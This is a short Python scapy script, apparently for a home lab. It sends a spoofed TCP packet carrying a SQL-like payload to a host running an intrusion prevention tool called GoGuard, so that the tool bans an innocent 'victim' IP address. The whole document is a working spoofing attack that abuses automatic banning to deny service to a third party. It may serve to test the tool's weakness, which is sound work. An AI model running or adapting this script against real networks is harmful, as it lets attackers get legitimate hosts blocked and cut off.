from scapy.all import IP, TCP, Raw, send

# CONFIGURATION
# The IP you want GoGuard to ban (e.g., your Windows Host or another VM)
victim_ip = "192.168.56.1"   
# Your Ubuntu VM running GoGuard
target_ip = "192.168.56.102"   
target_port = 22

print(f"--- Launching Spoofed Frame Job ---")
print(f"Goal: Trick GoGuard into banning {victim_ip}")

# Construct the packet: 
# We fake the 'src' to be the victim, but the payload is a DPI trigger
packet = IP(src=victim_ip, dst=target_ip) / \
         TCP(sport=443, dport=target_port, flags="PA") / \
         Raw(load="SELECT * FROM secret_database;")

# Send the malicious packet
send(packet)

print(f"Packet sent! Check GoGuard for a BAN on {victim_ip}")